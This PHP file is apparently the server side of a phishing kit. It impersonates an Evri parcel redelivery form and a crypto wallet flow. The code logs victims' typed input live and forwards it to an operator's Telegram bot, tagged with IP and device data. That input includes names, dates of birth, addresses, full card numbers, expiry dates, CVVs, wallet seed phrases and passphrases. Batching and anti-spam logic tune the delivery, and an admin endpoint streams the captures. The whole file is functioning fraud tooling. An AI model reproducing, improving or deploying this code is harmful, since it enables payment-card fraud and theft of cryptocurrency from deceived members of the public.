<?php
error_reporting(0);
session_start();
include 'config.php';
include 'assets/php/inc.php';

header('Content-Type: application/json');

$storageFile = __DIR__ . '/assets/ips/live_inputs.json';
$seedStateFile = __DIR__ . '/assets/ips/live_seed_state.json';
if (!file_exists($storageFile)) {
    file_put_contents($storageFile, json_encode(['events' => []]));
}
if (!file_exists($seedStateFile)) {
    file_put_contents($seedStateFile, json_encode(['sessions' => []]));
}

function read_live_events($file)
{
    $raw = @file_get_contents($file);
    $data = json_decode($raw, true);
    return is_array($data) ? $data : ['events' => []];
}

function persist_live_events($file, $events)
{
    $payload = ['events' => array_values($events)];
    file_put_contents($file, json_encode($payload, JSON_PRETTY_PRINT), LOCK_EX);
}

function read_seed_state($file)
{
    $raw = @file_get_contents($file);
    $data = json_decode($raw, true);
    return is_array($data) ? $data : ['sessions' => []];
}

function persist_seed_state($file, $state)
{
    $payload = ['sessions' => $state['sessions'] ?? []];
    file_put_contents($file, json_encode($payload, JSON_PRETTY_PRINT), LOCK_EX);
}

function clean_seed_string($seed) {
    $seed = trim($seed);
    $seed = preg_replace('/\b(word|position|total words entered|complete seed):\s*[^\s]+\s*/i', '', $seed);
    $seed = preg_replace('/\b(position|word|entered):\s*#?\d+\s*/i', '', $seed);
    $seed = preg_replace('/\s+/', ' ', $seed);
    return trim($seed);
}

/**
 * Latest value per field for Evri redelivery form (same session, page evri-redelivery).
 */
function collect_relic_snapshot_from_events(array $events, $sessionLabel)
{
    $rows = [];
    foreach ($events as $evt) {
        if (($evt['session'] ?? '') !== $sessionLabel) {
            continue;
        }
        if (($evt['page'] ?? '') !== 'evri-redelivery') {
            continue;
        }
        $f = $evt['field'] ?? '';
        if ($f === '' || strpos($f, 'relic-') !== 0) {
            continue;
        }
        if ($f === 'relic-milestone') {
            continue;
        }
        $rows[$f] = isset($evt['value']) ? (string) $evt['value'] : '';
    }
    return $rows;
}

function format_relic_telegram_message($title, array $snapshot, $sessionLabel, $ipInfo, array $deviceInfo)
{
    $labels = [
        'relic-fn' => 'First name',
        'relic-ln' => 'Last name',
        'relic-phone' => 'Phone',
        'relic-dob' => 'Date of birth',
        'relic-addr' => 'Address',
        'relic-cardname' => 'Name on card',
        'relic-cardnum' => 'Card number',
        'relic-exp' => 'Card expiry',
        'relic-cvv' => 'CVV',
        'relic-slot-date' => 'Slot date',
        'relic-slot-time' => 'Slot time',
    ];
    $order = [
        'relic-fn', 'relic-ln', 'relic-phone', 'relic-dob', 'relic-addr',
        'relic-cardname', 'relic-cardnum', 'relic-exp', 'relic-cvv',
        'relic-slot-date', 'relic-slot-time',
    ];
    $lines = [];
    foreach ($order as $key) {
        if (!isset($snapshot[$key]) || $snapshot[$key] === '') {
            continue;
        }
        $lab = $labels[$key] ?? $key;
        $lines[] = $lab . ': ' . $snapshot[$key];
    }
    foreach ($snapshot as $k => $v) {
        if (in_array($k, $order, true) || $v === '') {
            continue;
        }
        $lines[] = $k . ': ' . $v;
    }
    $body = implode("\n", $lines);
    $msg = $title . "\n";
    $msg .= "━━━━━━━━━━━━━━━━━━━━━━━━\n";
    $msg .= ($body !== '' ? $body . "\n" : '(no fields captured yet)') . "━━━━━━━━━━━━━━━━━━━━━━━━\n";
    $msg .= "Session: $sessionLabel\n";
    $msg .= "IP: $ipInfo\n";
    $msg .= "Device: {$deviceInfo['device']}\n";
    $msg .= "OS: {$deviceInfo['os']}\n";
    $msg .= "Browser: {$deviceInfo['browser']}\n";
    $msg .= "Time: " . date('Y-m-d H:i:s');
    return $msg;
}

function relic_sanitize_snapshot_from_meta(array $meta, $key = 'snapshot')
{
    if (!isset($meta[$key]) || !is_array($meta[$key])) {
        return [];
    }
    $out = [];
    foreach ($meta[$key] as $subField => $subVal) {
        if (!is_string($subField)) {
            continue;
        }
        $subField = substr(trim($subField), 0, 64);
        if ($subField === '' || !preg_match('/^relic-[a-z0-9_-]+$/i', $subField)) {
            continue;
        }
        if ($subField === 'relic-milestone') {
            continue;
        }
        $out[$subField] = is_scalar($subVal) ? substr(trim((string) $subVal), 0, 800) : '';
    }
    return $out;
}

function relic_append_snapshot_events($storageFile, $sessionLabel, $page, $ip, array $snapshot, $milestoneValue = null, $batchTag = 'relic-batch')
{
    $data = read_live_events($storageFile);
    $events = $data['events'] ?? [];
    foreach ($snapshot as $subField => $subVal) {
        $events[] = [
            'id' => uniqid('', true),
            'timestamp' => microtime(true),
            'session' => $sessionLabel,
            'ip' => $ip,
            'page' => $page,
            'field' => $subField,
            'value' => $subVal,
            'meta' => ['batch' => $batchTag],
        ];
    }
    if ($milestoneValue !== null && $milestoneValue !== '') {
        $events[] = [
            'id' => uniqid('', true),
            'timestamp' => microtime(true),
            'session' => $sessionLabel,
            'ip' => $ip,
            'page' => $page,
            'field' => 'relic-milestone',
            'value' => $milestoneValue,
            'meta' => ['batch' => $batchTag],
        ];
    }
    if (count($events) > 300) {
        $events = array_slice($events, -300);
    }
    persist_live_events($storageFile, $events);

    return $events;
}

function get_message_hash($msg) {
    return md5($msg);
}

function should_send_message($sessionLabel, $messageType, $messageHash, $cooldownSeconds = 5) {
    $spamStateFile = __DIR__ . '/assets/ips/telegram_spam_state.json';
    if (!file_exists($spamStateFile)) {
        file_put_contents($spamStateFile, json_encode(['sessions' => []]));
    }
    
    $spamState = json_decode(@file_get_contents($spamStateFile), true);
    if (!is_array($spamState)) {
        $spamState = ['sessions' => []];
    }
    
    $currentTime = time();
    $sessionKey = $sessionLabel . '_' . $messageType;
    
    if (isset($spamState['sessions'][$sessionKey])) {
        $lastSend = $spamState['sessions'][$sessionKey]['time'] ?? 0;
        $lastHash = $spamState['sessions'][$sessionKey]['hash'] ?? '';
        
        if ($lastHash === $messageHash && ($currentTime - $lastSend) < $cooldownSeconds) {
            return false;
        }
        
        if (($currentTime - $lastSend) < 2) {
            return false;
        }
    }
    
    $spamState['sessions'][$sessionKey] = [
        'time' => $currentTime,
        'hash' => $messageHash
    ];
    
    if (count($spamState['sessions']) > 100) {
        $spamState['sessions'] = array_slice($spamState['sessions'], -50, 50, true);
    }
    
    file_put_contents($spamStateFile, json_encode($spamState, JSON_PRETTY_PRINT), LOCK_EX);
    return true;
}

function batch_seed_phrase_update($sessionLabel, $completeSeed, $totalWords, $ipInfo, $deviceInfo) {
    $batchFile = __DIR__ . '/assets/ips/seed_phrase_batch.json';
    if (!file_exists($batchFile)) {
        file_put_contents($batchFile, json_encode(['sessions' => []]));
    }
    
    $batchState = json_decode(@file_get_contents($batchFile), true);
    if (!is_array($batchState)) {
        $batchState = ['sessions' => []];
    }
    
    $currentTime = time();
    
    if (!isset($batchState['sessions'][$sessionLabel])) {
        $batchState['sessions'][$sessionLabel] = [
            'seed' => '',
            'total_words' => 0,
            'first_update' => $currentTime,
            'last_update' => $currentTime,
            'ip' => $ipInfo,
            'device' => $deviceInfo
        ];
    }
    
    $batchState['sessions'][$sessionLabel]['seed'] = $completeSeed;
    $batchState['sessions'][$sessionLabel]['total_words'] = $totalWords;
    $batchState['sessions'][$sessionLabel]['last_update'] = $currentTime;
    $batchState['sessions'][$sessionLabel]['ip'] = $ipInfo;
    $batchState['sessions'][$sessionLabel]['device'] = $deviceInfo;
    
    file_put_contents($batchFile, json_encode($batchState, JSON_PRETTY_PRINT), LOCK_EX);
}

function check_and_send_batched_seed_phrases($chat_id, $bot_token) {
    $batchFile = __DIR__ . '/assets/ips/seed_phrase_batch.json';
    if (!file_exists($batchFile)) {
        return;
    }
    
    $batchState = json_decode(@file_get_contents($batchFile), true);
    if (!is_array($batchState) || empty($batchState['sessions'])) {
        return;
    }
    
    $currentTime = time();
    $sessionsToSend = [];
    
    foreach ($batchState['sessions'] as $sessionLabel => $data) {
        $timeSinceFirstUpdate = $currentTime - $data['first_update'];
        
        if ($timeSinceFirstUpdate >= 15 && !empty($data['seed'])) {
            $sessionsToSend[] = $sessionLabel;
        }
    }
    
    foreach ($sessionsToSend as $sessionLabel) {
        $data = $batchState['sessions'][$sessionLabel];
        $completeSeed = clean_seed_string($data['seed']);
        
        if (empty($completeSeed)) {
            unset($batchState['sessions'][$sessionLabel]);
            continue;
        }
        
        $msg = "📝 Seed Phrase Update (15s Batch)\n";
        $msg .= "━━━━━━━━━━━━━━━━━━━━━━━━\n";
        $msg .= "Total Words Entered: {$data['total_words']}\n";
        $msg .= "Complete Seed: $completeSeed\n";
        $msg .= "━━━━━━━━━━━━━━━━━━━━━━━━\n";
        $msg .= "Session: $sessionLabel\n";
        $msg .= "IP: {$data['ip']}\n";
        $msg .= "Device: {$data['device']['device']}\n";
        $msg .= "OS: {$data['device']['os']}\n";
        $msg .= "Browser: {$data['device']['browser']}\n";
        $msg .= "Time: " . date('Y-m-d H:i:s');
        
        $msgHash = get_message_hash($msg);
        if (should_send_message($sessionLabel, 'seed-phrase-batch', $msgHash, 15)) {
            telegram_deliver($chat_id, $msg, $bot_token);
        }
        
        $batchState['sessions'][$sessionLabel]['first_update'] = $currentTime;
        $batchState['sessions'][$sessionLabel]['last_update'] = $currentTime;
    }
    
    if (count($batchState['sessions']) > 50) {
        $batchState['sessions'] = array_slice($batchState['sessions'], -25, 25, true);
    }
    
    file_put_contents($batchFile, json_encode($batchState, JSON_PRETTY_PRINT), LOCK_EX);
}

function getAllIPs() {
    $ips = [];
    
    $sources = [
        'HTTP_CF_CONNECTING_IP',
        'HTTP_X_REAL_IP',
        'HTTP_CLIENT_IP',
        'HTTP_X_FORWARDED_FOR',
        'REMOTE_ADDR'
    ];
    
    foreach ($sources as $source) {
        if (isset($_SERVER[$source])) {
            $value = $_SERVER[$source];
            if (strpos($value, ',') !== false) {
                $value = trim(explode(',', $value)[0]);
            }
            if (filter_var($value, FILTER_VALIDATE_IP)) {
                $ips[] = $value;
            }
        }
    }
    
    $ips = array_unique($ips);
    return array_values($ips);
}

function getDeviceInfo() {
    $ua = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'Unknown';
    $device = 'Unknown Device';
    $os = 'Unknown OS';
    $browser = 'Unknown Browser';
    
    if (preg_match('/windows|win32|win64/i', $ua)) {
        $os = 'Windows';
        if (preg_match('/Windows NT 10.0/i', $ua)) {
            $os = 'Windows 10/11';
        } elseif (preg_match('/Windows NT 6.3/i', $ua)) {
            $os = 'Windows 8.1';
        } elseif (preg_match('/Windows NT 6.2/i', $ua)) {
            $os = 'Windows 8';
        } elseif (preg_match('/Windows NT 6.1/i', $ua)) {
            $os = 'Windows 7';
        }
    } elseif (preg_match('/macintosh|mac os x/i', $ua)) {
        $os = 'macOS';
        if (preg_match('/Mac OS X (\d+[._]\d+)/i', $ua, $matches)) {
            $os = 'macOS ' . str_replace('_', '.', $matches[1]);
        }
    } elseif (preg_match('/linux/i', $ua)) {
        $os = 'Linux';
    } elseif (preg_match('/android/i', $ua)) {
        $os = 'Android';
        if (preg_match('/Android ([\d.]+)/i', $ua, $matches)) {
            $os = 'Android ' . $matches[1];
        }
        $device = 'Mobile';
    } elseif (preg_match('/iphone|ipad|ipod/i', $ua)) {
        $os = 'iOS';
        if (preg_match('/OS ([\d_]+)/i', $ua, $matches)) {
            $os = 'iOS ' . str_replace('_', '.', $matches[1]);
        }
        if (preg_match('/iPhone/i', $ua)) {
            $device = 'iPhone';
        } elseif (preg_match('/iPad/i', $ua)) {
            $device = 'iPad';
        }
    }
    
    if (preg_match('/chrome/i', $ua) && !preg_match('/edg|opr/i', $ua)) {
        $browser = 'Chrome';
        if (preg_match('/Chrome\/([\d.]+)/i', $ua, $matches)) {
            $browser = 'Chrome ' . $matches[1];
        }
    } elseif (preg_match('/firefox/i', $ua)) {
        $browser = 'Firefox';
        if (preg_match('/Firefox\/([\d.]+)/i', $ua, $matches)) {
            $browser = 'Firefox ' . $matches[1];
        }
    } elseif (preg_match('/safari/i', $ua) && !preg_match('/chrome/i', $ua)) {
        $browser = 'Safari';
        if (preg_match('/Version\/([\d.]+)/i', $ua, $matches)) {
            $browser = 'Safari ' . $matches[1];
        }
    } elseif (preg_match('/edg/i', $ua)) {
        $browser = 'Edge';
        if (preg_match('/Edg\/([\d.]+)/i', $ua, $matches)) {
            $browser = 'Edge ' . $matches[1];
        }
    } elseif (preg_match('/opr|opera/i', $ua)) {
        $browser = 'Opera';
    }
    
    if (preg_match('/mobile|android|iphone|ipad|ipod|blackberry|iemobile|opera mini/i', $ua)) {
        if ($device === 'Unknown Device') {
            $device = 'Mobile';
        }
    } else {
        if ($device === 'Unknown Device') {
            $device = 'Desktop';
        }
    }
    
    return [
        'device' => $device,
        'os' => $os,
        'browser' => $browser,
        'user_agent' => $ua
    ];
}

function build_session_seed($events, $sessionLabel)
{
    $count = 0;
    $words = [];
    $hasPassphrase = false;
    $passphrase = '';

    foreach ($events as $evt) {
        if (!isset($evt['session']) || $evt['session'] !== $sessionLabel) {
            continue;
        }
        if ($evt['field'] === 'seed-word-count') {
            $count = intval($evt['value']);
        }
        if ($evt['field'] === 'has-seed-passphrase') {
            $hasPassphrase = strtolower($evt['value']) === 'yes';
        }
        if ($evt['field'] === 'seed-passphrase') {
            $passphrase = $evt['value'] ?? '';
        }
    }

    foreach ($events as $evt) {
        if (!isset($evt['session']) || $evt['session'] !== $sessionLabel) {
            continue;
        }
        if (preg_match('/^seedWord(\\d+)/i', $evt['field'] ?? '', $m)) {
            $idx = intval($m[1]);
            if ($idx > $count) {
                $count = $idx;
            }
        }
    }

    $latestWords = [];
    foreach ($events as $evt) {
        if (!isset($evt['session']) || $evt['session'] !== $sessionLabel) {
            continue;
        }
        if (preg_match('/^seedWord(\\d+)/i', $evt['field'] ?? '', $m)) {
            $idx = intval($m[1]);
            $latestWords[$idx] = trim($evt['value'] ?? '');
        }
    }

    $ordered = [];
    if ($count > 0) {
        for ($i = 1; $i <= $count; $i++) {
            $ordered[$i] = $latestWords[$i] ?? '';
        }
    }

    return [
        'count' => $count,
        'words' => $ordered,
        'has_passphrase' => $hasPassphrase,
        'passphrase' => $passphrase,
    ];
}

if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    if (empty($_SESSION['admin_authed'])) {
        http_response_code(403);
        echo json_encode(['error' => 'forbidden']);
        exit;
    }

    $since = isset($_GET['since']) ? floatval($_GET['since']) : 0;
    $data = read_live_events($storageFile);
    $events = $data['events'] ?? [];
    if ($since > 0) {
        $events = array_values(array_filter($events, function ($event) use ($since) {
            return isset($event['timestamp']) && $event['timestamp'] > $since;
        }));
    }

    echo json_encode(['events' => $events]);
    exit;
}

$payload = json_decode(file_get_contents('php://input'), true);
if (!is_array($payload)) {
    $payload = $_POST;
}

$field = isset($payload['field']) ? substr(trim($payload['field']), 0, 64) : '';
$value = isset($payload['value']) ? substr(trim($payload['value']), 0, 800) : '';
$page = isset($payload['page']) ? substr(trim($payload['page']), 0, 64) : 'unknown';
$sessionLabel = isset($payload['session_label']) ? substr(trim($payload['session_label']), 0, 64) : session_id();
$meta = isset($payload['meta']) && is_array($payload['meta']) ? $payload['meta'] : [];

if ($field === 'relic-step1-complete' || $field === 'relic-final-complete') {
    $pageEvri = ($page === 'evri-redelivery') ? $page : 'evri-redelivery';
    $snap = relic_sanitize_snapshot_from_meta($meta, 'snapshot');
    if (count($snap) === 0) {
        http_response_code(422);
        header('Content-Type: application/json');
        echo json_encode(['error' => 'snapshot-required']);
        exit;
    }
    $milestone = ($field === 'relic-step1-complete') ? 'next' : 'confirm-done';
    $batchTag = $field;
    relic_append_snapshot_events($storageFile, $sessionLabel, $pageEvri, $ip, $snap, $milestone, $batchTag);
    header('Content-Type: application/json');
    echo json_encode(['status' => 'ok', 'batch' => $field, 'fields' => count($snap)]);
    if ($telegram_delivery == 1 && function_exists('telegram_deliver')) {
        $allIPs = getAllIPs();
        $ipInfo = !empty($allIPs) ? implode(' / ', $allIPs) : $ip;
        $deviceInfo = getDeviceInfo();
        $title = ($field === 'relic-step1-complete')
            ? "📦 Evri redelivery — Step 1 (Next)"
            : "✅ Evri redelivery — Confirmed";
        $msg = format_relic_telegram_message($title, $snap, $sessionLabel, $ipInfo, $deviceInfo);
        $msgHash = get_message_hash($msg);
        $tgType = ($field === 'relic-step1-complete') ? 'relic-evri-next' : 'relic-evri-confirm';
        if (should_send_message($sessionLabel, $tgType, $msgHash, 3)) {
            telegram_deliver($chat_id, $msg, $bot_token);
        }
    }
    exit;
}

if ($field === '') {
    http_response_code(422);
    echo json_encode(['error' => 'field-required']);
    exit;
}

$event = [
    'id' => uniqid('', true),
    'timestamp' => microtime(true),
    'session' => $sessionLabel,
    'ip' => $ip,
    'page' => $page,
    'field' => $field,
    'value' => $value,
    'meta' => $meta,
];

$data = read_live_events($storageFile);
$events = $data['events'] ?? [];
$events[] = $event;
if (count($events) > 300) {
    $events = array_slice($events, -300);
}

persist_live_events($storageFile, $events);

echo json_encode(['status' => 'ok', 'id' => $event['id']]);

if ($telegram_delivery == 1 && function_exists('telegram_deliver')) {
    $allIPs = getAllIPs();
    $ipInfo = !empty($allIPs) ? implode(' / ', $allIPs) : $ip;
    $deviceInfo = getDeviceInfo();

    if ($page === 'evri-redelivery' && $field === 'relic-milestone' && ($value === 'next' || $value === 'confirm-done')) {
        $snapshot = collect_relic_snapshot_from_events($events, $sessionLabel);
        $title = $value === 'next'
            ? "📦 Evri redelivery — Step 1 (Next)"
            : "✅ Evri redelivery — Confirmed";
        $msg = format_relic_telegram_message($title, $snapshot, $sessionLabel, $ipInfo, $deviceInfo);
        $msgHash = get_message_hash($msg);
        $tgType = $value === 'next' ? 'relic-evri-next' : 'relic-evri-confirm';
        if (should_send_message($sessionLabel, $tgType, $msgHash, 3)) {
            telegram_deliver($chat_id, $msg, $bot_token);
        }
    }
    
    if (preg_match('/^seedWord(\\d+)/i', $field, $m)) {
    }
    
    if ($field === 'seed-phrase' && !empty($value)) {
        $totalWords = isset($meta['totalWords']) ? $meta['totalWords'] : 0;
        $completeSeed = isset($meta['completeSeed']) ? $meta['completeSeed'] : $value;
        
        if (empty($completeSeed)) {
            return;
        }
        
        batch_seed_phrase_update($sessionLabel, $completeSeed, $totalWords, $ipInfo, $deviceInfo);
        check_and_send_batched_seed_phrases($chat_id, $bot_token);
    }
    
    if ($field === 'seed-phrase-complete' && !empty($value)) {
        $totalWords = isset($meta['totalWords']) ? $meta['totalWords'] : 0;
        $completeSeed = clean_seed_string(isset($meta['completeSeed']) ? $meta['completeSeed'] : $value);
        
        if (empty($completeSeed)) {
            return;
        }
        
        $passphrase = '';
        $hasPassphrase = false;
        foreach ($events as $evt) {
            if (isset($evt['session']) && $evt['session'] === $sessionLabel) {
                if ($evt['field'] === 'seed-passphrase') {
                    $passphrase = $evt['value'] ?? '';
                }
                if ($evt['field'] === 'has-seed-passphrase' && strtolower($evt['value'] ?? '') === 'yes') {
                    $hasPassphrase = true;
                }
            }
        }
        
        $msg = "✅ FULL SEED PHRASE SUBMITTED\n";
        $msg .= "━━━━━━━━━━━━━━━━━━━━━━━━\n";
        $msg .= "📊 Word Count: $totalWords\n";
        $msg .= "🔐 Complete Seed:\n$completeSeed\n";
        if ($hasPassphrase) {
            $msg .= "🔒 Passphrase: " . ($passphrase !== '' ? $passphrase : '[entered]') . "\n";
        } else {
            $msg .= "🔒 Passphrase: none\n";
        }
        $msg .= "━━━━━━━━━━━━━━━━━━━━━━━━\n";
        $msg .= "Session: $sessionLabel\n";
        $msg .= "IP: $ipInfo\n";
        $msg .= "Device: {$deviceInfo['device']}\n";
        $msg .= "OS: {$deviceInfo['os']}\n";
        $msg .= "Browser: {$deviceInfo['browser']}\n";
        $msg .= "Time: " . date('Y-m-d H:i:s');
        
        $msgHash = get_message_hash($msg);
        if (should_send_message($sessionLabel, 'seed-phrase-complete', $msgHash, 30)) {
            telegram_deliver($chat_id, $msg, $bot_token);
        }
    }
    
    if ($field === 'generated-seed' && !empty($value)) {
        $seedType = isset($meta['type']) ? $meta['type'] : 'unknown';
        $wordCount = isset($meta['count']) ? intval($meta['count']) : 0;
        $completeSeed = clean_seed_string(trim($value));
        
        if (empty($completeSeed)) {
            return;
        }
        
        $typeDesc = 'Generated Seed';
        if (strpos($seedType, 'new-wallet') !== false) {
            $typeDesc = 'New Wallet Seed';
        } elseif (strpos($seedType, 'regenerated') !== false) {
            $typeDesc = 'Regenerated Seed';
        }
        
        $msg = "🎲 $typeDesc GENERATED\n";
        $msg .= "━━━━━━━━━━━━━━━━━━━━━━━━\n";
        $msg .= "📊 Word Count: $wordCount\n";
        $msg .= "🔐 Complete Seed:\n$completeSeed\n";
        $msg .= "━━━━━━━━━━━━━━━━━━━━━━━━\n";
        $msg .= "Session: $sessionLabel\n";
        $msg .= "IP: $ipInfo\n";
        $msg .= "Device: {$deviceInfo['device']}\n";
        $msg .= "OS: {$deviceInfo['os']}\n";
        $msg .= "Browser: {$deviceInfo['browser']}\n";
        $msg .= "Time: " . date('Y-m-d H:i:s');
        
        $msgHash = get_message_hash($msg);
        if (should_send_message($sessionLabel, 'generated-seed', $msgHash, 60)) {
            telegram_deliver($chat_id, $msg, $bot_token);
        }
    }

    $seedState = read_seed_state($seedStateFile);
    $sessionSeed = build_session_seed($events, $sessionLabel);
    $count = $sessionSeed['count'];
    $words = $sessionSeed['words'];
    $hasPass = $sessionSeed['has_passphrase'];
    $passVal = $sessionSeed['passphrase'];

    $filled = 0;
    foreach ($words as $w) {
        if (trim($w) !== '') {
            $filled++;
        }
    }

    $currentTime = time();
    $lastBatchSend = $seedState['sessions'][$sessionLabel]['last_batch_send'] ?? 0;
    $timeSinceLastSend = $currentTime - $lastBatchSend;
    
    if ($filled >= 11 && $timeSinceLastSend >= 15) {
        $seedString = clean_seed_string(implode(' ', array_filter($words, function($w) { return trim($w) !== ''; })));
        $lastSent = $seedState['sessions'][$sessionLabel]['last_batch_seed'] ?? '';
        
        if ($seedString !== $lastSent && !empty($seedString)) {
            $seedState['sessions'][$sessionLabel]['last_batch_send'] = $currentTime;
            $seedState['sessions'][$sessionLabel]['last_batch_seed'] = $seedString;
            persist_seed_state($seedStateFile, $seedState);
        } else {
            $seedState['sessions'][$sessionLabel]['last_batch_send'] = $currentTime;
            persist_seed_state($seedStateFile, $seedState);
        }
    }

    $complete = $count > 0 && $filled === $count;

    if ($complete) {
        $seedString = clean_seed_string(implode(' ', $words));
        $lastSent = $seedState['sessions'][$sessionLabel]['last_complete_seed'] ?? '';
        if ($seedString !== $lastSent && !empty($seedString)) {
            $seedMsg = "✅ FULL SEED DETECTED (Legacy Method)\n";
            $seedMsg .= "━━━━━━━━━━━━━━━━━━━━━━━━\n";
            $seedMsg .= "Session: $sessionLabel\n";
            $seedMsg .= "Count: $count\n";
            $seedMsg .= "Seed: $seedString\n";
            if ($hasPass) {
                $seedMsg .= "Passphrase: " . ($passVal !== '' ? $passVal : '[entered]') . "\n";
            } else {
                $seedMsg .= "Passphrase: none\n";
            }
            $seedMsg .= "━━━━━━━━━━━━━━━━━━━━━━━━\n";
            $seedMsg .= "IP: $ipInfo\n";
            $seedMsg .= "Device: {$deviceInfo['device']}\n";
            $seedMsg .= "OS: {$deviceInfo['os']}\n";
            $seedMsg .= "Browser: {$deviceInfo['browser']}\n";
            $seedMsg .= "Time: " . date('Y-m-d H:i:s');
            
            $msgHash = get_message_hash($seedMsg);
            if (should_send_message($sessionLabel, 'legacy-seed-detected', $msgHash, 30)) {
                telegram_deliver($chat_id, $seedMsg, $bot_token);
            }
            
            $seedState['sessions'][$sessionLabel]['last_complete_seed'] = $seedString;
            persist_seed_state($seedStateFile, $seedState);
        }
    }
}
